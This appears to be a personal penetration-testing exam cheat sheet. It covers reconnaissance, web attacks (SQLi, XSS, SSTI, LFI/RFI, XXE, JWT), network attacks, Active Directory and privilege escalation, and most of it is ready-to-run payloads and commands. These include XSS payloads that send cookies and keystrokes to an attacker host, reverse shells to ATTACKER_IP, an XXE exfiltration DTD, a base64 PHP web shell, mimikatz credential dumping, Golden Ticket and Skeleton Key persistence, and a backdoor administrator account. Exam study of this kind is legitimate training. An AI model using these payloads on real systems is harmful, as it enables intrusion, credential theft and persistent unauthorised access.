### Table of contents
- [[#1. Reconnaissance & Enumeration]]
- [[#2. Web Application Testing]]
- [[#3. Network Penetration Testing]]
- [[#4. Active Directory Exploitation]]

### 1. Reconnaissance & Enumeration
[[#Table of contents|Back to the top]]

#### Passive Recon

```bash
whois domain.com
nslookup -type=ANY domain.com
dig domain.com [A|MX|TXT|CNAME]
```

- Use [DNSDumpster](https://dnsdumpster.com/), [crt.sh](https://crt.sh/), [Shodan](https://shodan.io/)
- Subdomain enumeration: `site:*.domain.com -site:www.domain.com` (Google dork)
- Google dorks: `site:example.com inurl:admin`, `filetype:log "password"`
- Sublist3r: `./sublist3r.py -d domain.com`

#### Active Recon

```bash
ffuf -w wordlist.txt -u http://target/FUZZ          # directory fuzzing
gobuster dir -u http://target -w wordlist.txt
dirb http://target wordlist.txt
```

- Virtual host fuzzing:
```bash
ffuf -w subdomains.txt -H "Host: FUZZ.target.thm" -u http://IP -fs SIZE
```

#### Nmap Scanning (Quick Reference)

|Goal|Command|
|---|---|
|Live hosts (ARP/ICMP)|`nmap -sn 10.10.10.0/24`|
|SYN scan (default)|`nmap -sS <target>`|
|TCP connect scan|`nmap -sT <target>`|
|UDP scan|`nmap -sU <target>`|
|Service/version|`nmap -sV <target>`|
|OS detection|`nmap -O <target>`|
|Speed up|`-T4`, `--min-rate 1000`|
|Full port scan|`nmap -p- <target>`|
|Script scan (safe)|`nmap -sC <target>`|
|Output all formats|`nmap -oA scan <target>`|
|Firewall evasion|`-f` (fragment), `-D RND:5` (decoys), `-sS -Pn`|

---
### 2. Web Application Testing
[[#Table of contents|Back to the top]]

#### Quick Vulnerability Decision Tree

1. **Is authentication present?**  
    → Test for: Default credentials, username enumeration, brute force, password reset flaws, MFA bypass.
    
2. **Any dynamic parameters?**  
    → Test for: SQLi, NoSQLi, Command Injection, XXE, SSTI, LFI/RFI.  
    → Manipulate HTTP methods, hidden fields, headers.
    
3. **File upload / import?**  
    → Test for: Unrestricted file upload, XXE (if XML), Path Traversal, LFI.
    
4. **User‑supplied data reflected?**  
    → Test for: XSS (Reflected/DOM), SSTI, Open Redirect.
    
5. **Direct object references** (like `?id=1`)?  
    → IDOR.
    
6. **API endpoints returning JSON/XML?**  
    → Check for BOLA, excessive data exposure, JWT attacks, NoSQL injection.
    
---
#### a) SQL Injection

**Manual Testing Steps**

1. `?id=1'` → error? If yes, move on.
    
2. `?id=1' OR 1=1--` → bypass logic.
    
3. Determine number of columns:  
    `?id=1' ORDER BY 1--` (increase until error)  
    `?id=1' UNION SELECT NULL,NULL--` (add NULLs until match)
    
4. Extract data:

```sql
0 UNION SELECT 1,2,database()--
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='db'--
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
0 UNION SELECT 1,2,group_concat(username,':',password) FROM users--
```

**Boolean‑blind**

- `?id=1' AND 1=1--` vs `?id=1' AND 1=2--` (observe differences)
- Use `LIKE` to brute‑force characters:  
    `?id=1' AND database() LIKE 'a%'--`
    

**Time‑blind**

- `?id=1' AND SLEEP(5)--` if true → 5‑second delay.
	- Example: `?id=1' AND database() LIKE 'a%' AND SLEEP(5)--`
    

**Authentication Bypass**

- Username: `' OR 1=1;--`
- Password: anything
    

**Filter Evasion**

- Spaces replaced: `/**/`, `%0A`, `%09`
- Keywords: SeLeCt, `/*!50000SELECT*/`
- Quotes: `0x61646d696e` (hex 'admin')
- `OR` → `||` (URL-encoded)

**SQLMap** (when manual is too slow)

```bash
sqlmap -u "http://target/page?id=1" --dbs
sqlmap -u "http://target/page?id=1" -D db -T users --dump
```

---
#### b) NoSQL Injection (MongoDB)

**Operator Injection**

- Test by sending arrays:  
    `user[$ne]=test&pass[$ne]=test` → login as first user.
    
- Bypass login: `user[$ne]=&pass[$ne]=`
    
- Enumerate passwords with `$regex`:  
    `pass[$regex]=^.{6}$` (length)  
    `pass[$regex]=^a.*$` (character)
    
**Syntax Injection (JS)**

- Input `'` to trigger error.
- Inject `' || 1 || '` to return all documents.

---
#### c) XSS (Cross‑Site Scripting)

**Payload Cheatsheet**

- POC: `<script>alert('XSS')</script>`
- Session steal: `<script>fetch('http://attacker/?c='+document.cookie)</script>`
- Keylogger: `<script>document.onkeypress=function(e){fetch('http://attacker/?k='+e.key)}</script>`
- DOM‑based: check `window.location.hash`, innerHTML, eval().

**Bypass Filters**

- Break out of attribute: `"><script>alert(1)</script>`
- Break out of textarea: `</textarea><script>alert(1)</script>`
- Use `onload` in image: `" onload="alert(1)`
- Bypass `script` removal: `<sscriptcript>alert(1)</sscriptcript>`
- Encoded: `&lt;script&gt;...`

---
#### d) SSTI (Server‑Side Template Injection)

**Detection (Decision Tree)**

1. `${7*7}` → 49? → **Smarty/Mako**
    - Further test: `a{*comment*}b` → `ab` → **Smarty**
        
2. `{{7*7}}` → 49? → **Jinja2/Twig**
    - `{{7*'7'}}` → `7777777` → **Jinja2**; `49` → **Twig**
        
3. `#{7*7}` → 49? → **Pug/Jade**

**Exploitation Payloads**

- **Jinja2:**
```python
{{ ''.__class__.__mro__[1].__subclasses__()[IDX]("whoami", shell=True, stdout=-1).communicate() }}
```
	Find IDX by searching output for `subprocess.Popen`.
    
- **Twig:** `{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('whoami')}}`
    
- **Smarty:** `{system("ls")}` or `{exec("whoami")}`
    
- **Pug:**
```text
#{root.process.mainModule.require('child_process').spawnSync('whoami').stdout}
```

---
#### e) File Inclusion / Path Traversal

**LFI**

- Basic: `?page=../../../../etc/passwd`
- Null byte (PHP <5.3.4): `%00`
- Bypass filters: `....//....//`
- PHP wrappers:
    - Read source: `php://filter/convert.base64-encode/resource=index.php`
    - RCE: `php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=whoami`

**Log Poisoning (LFI to RCE)**

1. Inject PHP into User‑Agent via netcat:  
    `echo "<?php system(\$_GET['cmd']); ?>" | nc target 80`
2. Invoke: `?page=/var/log/apache2/access.log&cmd=id`

**RFI** (need `allow_url_fopen` on)  
`?page=http://attacker.com/evil.txt`
- evil.txt: `<?php system('whoami'); ?>`

---
#### f) SSRF (Server‑Side Request Forgery)

**Basic Tricks**

- Localhost bypass: `http://127.1/`, `http://localhost`, `http://0.0.0.0/`
- Cloud metadata: `http://169.254.169.254/`
- Use `@` to confuse: `http://expected.com@attacker.com/`
- Directory traversal: `?url=/../admin`
- DNS rebinding registrars: `nip.io` (e.g., `127.0.0.1.nip.io`)

**Blind SSRF**

- Set up a server to capture callbacks: `python3 -m http.server 8080`
- Force DNS/HTTP request to your IP.

---
#### g) XXE (XML External Entity)

**In‑band**

```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```

**Out‑of‑band**

1. Host a DTD on your server:
    
```xml
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://attacker/?data=%cmd;'>">
%oob;
```

2. Call the DTD from the XML payload.

---
#### h) JWT (JSON Web Token) Attacks

- **None algorithm:**  
    `eyJhbGciOiJOb25lIn0.eyJhZG1pbiI6MX0.` (signature ignored)
    
- **Crack HS256 secret:**  
    `hashcat -m 16500 jwt.txt wordlist.txt`
    
- **Algorithm confusion (RS256→HS256):**  
    Use the public key as HMAC secret; encode with [jwt.io](https://jwt.io/).

---
#### i) Other Web Must‑Knows

**IDOR** – Change IDs in URLs, parameters, or AJAX calls.  
**Command Injection** – Test with `; ls`, `| whoami`, `&& id`.  
**File Upload** – Try `.php`, `.php5`, `.phtml`, double extensions `.jpg.php`.  
**Insecure Deserialisation** – Look for serialised objects in cookies/POST. Use PHPGGC to generate payloads.

---
### 3. Network Penetration Testing
[[#Table of contents|Back to the top]]

#### Port & Service Enumeration

```bash
# Quick top 1000 ports
nmap -sS -sV -O 10.10.10.10
# Full port
nmap -p- -sS 10.10.10.10 --min-rate 5000
# UDP
nmap -sU --top-ports 100 10.10.10.10
```

#### Brute‑Forcing Services

**Hydra**

```bash
hydra -l admin -P pass.txt ftp://10.10.10.10
hydra -L user.txt -P pass.txt ssh://10.10.10.10
hydra -l admin -P pass.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```

**SSH**

```bash
ssh user@10.10.10.10
# Private key
chmod 600 key && ssh -i key user@10.10.10.10
```

**FTP** – Check for anonymous login.  
**SMB** – `smbclient -L //10.10.10.10 -N`, `enum4linux`.  
**SNMP** – `snmpwalk -v2c -c public 10.10.10.10`.

#### Shells & Transfer

**Reverse Shells**

```bash
# Netcat listener
nc -lvnp 4444
# Payloads (target):
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
nc ATTACKER_IP 4444 -e /bin/bash
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Stabilise shell:**

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
# reset
```

**File Transfer**

```bash
# Attacker:
python3 -m http.server 80
# Target:
wget http://ATTACKER_IP/file
curl http://ATTACKER_IP/file -o file
certutil -urlcache -f http://ATTACKER_IP/file file   # Windows
```

---
### 4. Active Directory Exploitation
[[#Table of contents|Back to the top]]

> Your notes lack dedicated AD attack techniques; learn these essentials before the exam.

#### Enumeration (from a foothold)

```powershell
# PowerView / SharpView
Get-NetDomain
Get-NetUser | select samaccountname
Get-NetGroup "Domain Admins"
Get-NetComputer
# BloodHound (using SharpHound)
SharpHound.exe -c All
```

#### Kerberos Attacks

**Kerberoasting**

```powershell
# Request TGS for SPN accounts
Rubeus.exe kerberoast /outfile:hashes.txt
# or
Invoke-Kerberoast -OutputFormat Hashcat | fl
```

Crack with hashcat: `hashcat -m 13100 hashes.txt rockyou.txt`

**AS‑REP Roasting** (users without pre‑auth)

```powershell
Get-NetUser -PreauthNotRequired
Rubeus.exe asreproast /outfile:asrep.txt
```

#### Pass‑the‑Hash / Pass‑the‑Ticket

```bash
# Pass the hash
psexec.py DOMAIN/user@10.10.10.10 -hashes :NTLMHASH
crackmapexec smb 10.10.10.0/24 -u user -H NTLMHASH
# Pass the ticket
mimikatz # sekurlsa::tickets /export
# Inject ticket: kerberos::ptt ticket.kirbi
```

#### SMB Relay & LLMNR Poisoning

- Use `responder` to capture NTLMv2 hashes, then relay with `ntlmrelayx` if SMB signing disabled.
    
#### Persistence

- Golden Ticket: DCSync privileges → `mimikatz # lsadump::dcsync /domain:DOMAIN /user:krbtgt` → craft ticket.
    
- Skeleton Key: `mimikatz # misc::skeleton` (injects master password into LSASS).

---
### 5. Exploitation & Post‑Exploitation
[[#Table of contents|Back to the top]]

#### Linux Privilege Escalation

**Checklist**

```bash
# Kernel
uname -a
cat /proc/version
# Sudo rights
sudo -l         # look for GTFOBins
find / -perm -4000 2>/dev/null  # SUID
# Cron jobs
cat /etc/crontab
# Capabilities
getcap -r / 2>/dev/null
# Writable PATH
find / -writable 2>/dev/null
echo $PATH
# Exploit: create a script with same name as a command run by privileged cron/SUID.
# NFS shares with no_root_squash
showmount -e <target>
# Mount, create SUID binary.
```

**Automated tools:** `linpeas.sh`, `LinEnum`.

#### Windows Privilege Escalation

**Quick wins:**

- `whoami /priv` → check `SeImpersonate`, `SeBackup`, `SeTakeOwnership`
- Search for unattended install files: `C:\Unattend.xml`, etc.
- PowerShell history: `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
- Stored credentials: `cmdkey /list`, then `runas /savecred`.

**Service misconfigurations:**

- Check permissions: `icacls "service.exe"` → if `Everyone:(F)`, replace binary.
- Unquoted paths: find writable folder in path, place malicious exe.
- Check DACL with `accesschk64.exe -qlc service_name`.

**Tools:** `winpeas.exe`, `PrivescCheck.ps1`, `WES-NG` (from attacker).

---

#### Maintaining Access

- Add local user: `net user backdoor pass /add && net localgroup administrators backdoor /add` (Windows)
- SSH key persistence: append attacker's public key to `~/.ssh/authorized_keys`
- Scheduled task / cron job.

---
### 6. Quick Command Cheatsheet
[[#Table of contents|Back to the top]]

|Task|Command|
|---|---|
|Directory fuzzing|`ffuf -w common.txt -u http://target/FUZZ`|
|Subdomain brute|`dnsrecon -t brt -d domain.com` or `ffuf -u http://FUZZ.domain.com -w subdomains.txt`|
|SQL injection (blind)|Use Burp Intruder with `LIKE` clauses|
|Crack hashes|`john --wordlist=rockyou.txt hash` / `hashcat -m TYPE hash wordlist`|
|Search exploits|`searchsploit keyword`|
|Netcat listener|`nc -lvnp 4444`|
|Python HTTP server|`python3 -m http.server 80`|
|Metasploit handler|`msfconsole -q -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST IP; set LPORT 4444; run"`|
|Download to Windows|`certutil -urlcache -f http://IP/file file` or `iwr -Uri http://IP/file -OutFile file`|

---

**Good luck!** The exam rewards methodical enumeration; follow the decision trees above and you’ll know where to attack next. Fill the AD gap, and you’ll be fully prepared.